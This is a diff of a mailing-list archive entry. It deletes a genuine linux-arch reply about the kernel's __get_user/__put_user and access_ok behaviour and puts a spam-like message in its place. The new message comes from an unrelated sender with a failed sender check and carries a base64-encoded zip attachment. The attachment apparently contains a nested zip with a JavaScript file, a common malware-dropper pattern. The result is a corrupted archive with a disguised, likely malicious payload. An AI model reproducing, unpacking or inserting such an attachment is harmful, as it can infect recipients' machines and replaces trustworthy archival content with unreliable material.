@@ -1,55 +1,101 @@
-From: Brian Gerst <brgerst@gmail.com>
-Subject: Re: [git pull] uaccess-related bits of vfs.git
-Date: Sat, 13 May 2017 09:46:59 -0400
-Message-ID: <CAMzpN2iFPQLWV3rH=FR0DVtd-RdXxyUvDLW5HOjt-KJN0Daemw@mail.gmail.com>
-References: <CA+55aFww=ZG0wPad3ELg+ibScr0eWuSxvhGLFaF+PO9kfkSkdw@mail.gmail.com>
- <20170501034536.GX29622@ZenIV.linux.org.uk> <CA+55aFwJXjvYQ7WLmh3z62KQ08XCR89Qh-koC=UTYW+enK6OPQ@mail.gmail.com>
- <20170513065745.GV390@ZenIV.linux.org.uk> <20170513120527.sdmkwveoo2mq32hf@angband.pl>
+From: <nfrankiyamu@centrum.cz>
+Subject: 7478 linux-arch
+Date: Sat, 13 May 2017 15:46:12 -0000
+Message-ID: <149469037253.15599.15034322611023107858@mari-el.ru>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="UTF-8"
+Content-Type: application/zip; name="08.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-arch-owner@vger.kernel.org>
-Received: from mail-vk0-f66.google.com ([209.85.213.66]:35673 "EHLO
-        mail-vk0-f66.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1752043AbdEMNrA (ORCPT
-        <rfc822;linux-arch@vger.kernel.org>); Sat, 13 May 2017 09:47:00 -0400
-In-Reply-To: <20170513120527.sdmkwveoo2mq32hf@angband.pl>
+Received: from 43.34.pppoe.mari-el.ru ([77.40.34.43]:46879 "HELO mari-el.ru"
+        rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1752474AbdEMPqR (ORCPT <rfc822;linux-arch@vger.kernel.org>);
+        Sat, 13 May 2017 11:46:17 -0400
+Content-Disposition: attachment
 Sender: linux-arch-owner@vger.kernel.org
 List-ID: <linux-arch.vger.kernel.org>
-To: Adam Borowski <kilobyte@angband.pl>
-Cc: Al Viro <viro@zeniv.linux.org.uk>, Linus Torvalds <torvalds@linux-foundation.org>, Linux Kernel Mailing List <linux-kernel@vger.kernel.org>, "linux-arch@vger.kernel.org" <linux-arch@vger.kernel.org>
+To: linux-arch@vger.kernel.org
 
-On Sat, May 13, 2017 at 8:05 AM, Adam Borowski <kilobyte@angband.pl> wrote:
-> On Sat, May 13, 2017 at 07:57:45AM +0100, Al Viro wrote:
->> On Fri, May 12, 2017 at 06:00:44PM -0700, Linus Torvalds wrote:
->> > But the *first* thing I'd like to do would be to just get rid of
->> > __get_user/__put_user as a thing. It really does generate nasty code,
->> > and we might as well just make it do that function call.
->>
->> But IMO the first step is not to convert __get_user()/__put_user() to
->> aliases of get_user()/put_user() - it's to get rid of their infestations
->> outside of arch/*.  They are concentrated in relatively few places, so
->> we can deal with those individually and then just fucking ban their use
->> outside of arch/*.  That's easy enough to watch for - simple git grep will do,
->> so anything creeping back will be immediately spotted.
->
-> As someone from the peanuts gallery, I took a look for __put_user() in my
-> usual haunt, drivers/tty/vt/
->
-> * use 1: con_[gs]et_trans_*():
->   Copies a linear array of 256 bytes/shorts, one by one.
->   The obvious patch has 9 insertions(+), 22 deletions(-).
->
-> * use 2: con_[gs]et_unimap():
->   Ditto, up to 65535*2 shorts, also in a nice linear array.
->
-> * use 3: tioclinux():
->   Does a __put into a place that was checked only for read.  This got me
->   frightened as it initially looked like something that can allow an user to
->   write where they shouldn't.  Fortunately, it turns out the first argument
->   to access_ok() is ignored on every single architecture -- why does it even
->   exist then?  I imagined it's there for some odd arch that allows writes
->   when in privileged mode, but unlike what the docs say, VERIFY_WRITE is
->   exactly same as VERIFY_READ.
-
-The original i386 (no longer supported) ignored the write-protect bit
-when in supervisor mode.
+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
+/Mlndk+WgR4vbmhWxUHiII8xaX0XgNRrU38D+qNEyKqW8qotU8SOMTYA8ol4YPWLKRaKplySnK4a
+wd8zu//I/gp4gxG+Qf4hocjK8EPuAe6TuC8kWlShLf06PeYOrJbSzQvZvkjUiQtRbmLVXp8R6EGF
+sEn6g/gRt4r1xO8b69LFBgz1k4HklayuJzoS6S/1T1b/pxiY6Ddla8lA3ZL7ZOYaAwZUyRQJu28u
+fqHo0i1xDbHFgdujGoPFBAUTkhE7JFjrt9B5WGhMsQjSDijid4UA3p5hZetblzCehiYfEmCXcXEx
+vK2HXttAJQYG7hNJm7ubkREmjgMl7uv6cIsWbWoWJmMyql8f0m2FYsnSWTAgZVP9huGbM6KuROEV
+TfBQFt0W3m4jGYpqD3DDLnp7dZss/WrSgMV2xgTKjSg570fkDH1HJZpQOkP4f4Ha/AIv9mkTnDy5
+02D5KWEYekEEXkhiXQ8jfbp7QYj/OJaO9N7mF8BLjuthgCBPeH1V3HlLnLm1kTmwFzlTZi4a5o8f
+iWW6JRwPnpgNKPfEDMhzKSP1k5ek1/788O039cyy+ViezbOd3H2p3XvrtlbXtcY+/JqMrTrFfo+d
+fftN5ulqNOi9lbKLztfZ+6R6W1g3aTWnuslLU/9Ux+umnciL95sLL1edNuOJP3nPv+IJ7/zcW7cJ
+x+Pqe5zPn/jz178S3t/bO8AGfW9Re6w/3WUuK8VC9Nb/Mirn4plF7rnRH+RvH6+z3eGX2br9eHVt
+zeqyGuEC2pPJ8LUzjX9utvJvQ943cdIddPrxWCyxunrs229erxs3td64fTd6zlYvu965BABRBbqb
+15xXX+PQNbHCSDQYe/F5dexNM5X51bD98vw+ePj6ebwa9tcz9vIPL9fujF9W97Jc9fqVaqF0efLa
+7LembdZUqfWaS1dPzeyXSeOh8twOL29HX1fDzjLXFyt5WPH+sru+9whH/AmHSng/e8W7wc1K3heT
+i5UcP62EtP/Lx49BKp36Mf0xFWwpG+fTfXcudU2lg/Sn334MPv7+ezKV8Hzf+89dPwa/poMPP378
+tPr7bdP1Jsy3O7f6prZiVMjUPsd10POWeWzcriKVlVTkW3PNVtPxrOnqw+fSXaLq66SZWOMyXD50
+52/ldcC2CtOaz54695bZfmNS1qZGX5QorGNN/RXXtN5flp3x9aB981xt3NXz8y9F73zDFThw4uxf
+UEsBAj8AFAAAAAgAenytSsjPc7yDEQAAJVkAAAgAJAAAAAAAAAAgAAAAAAAAADIxNjE1LmpzCgAg
+AAAAAAABABgAzQyXRjnM0gHNDJdGOczSAUGedUY5zNIBUEsFBgAAAAABAAEAWgAAAKkRAAAAAFBL
+AQI/AAoAAAAAAHp8rUp3DEqjGRIAABkSAAAJACQAAAAAAAAAIAAAAAAAAAAyMTYxNS56aXAKACAA
+AAAAAAEAGAB9YZlGOczSAc0Ml0Y5zNIBwQB4RjnM0gFQSwUGAAAAAAEAAQBbAAAAQBIAAAAA
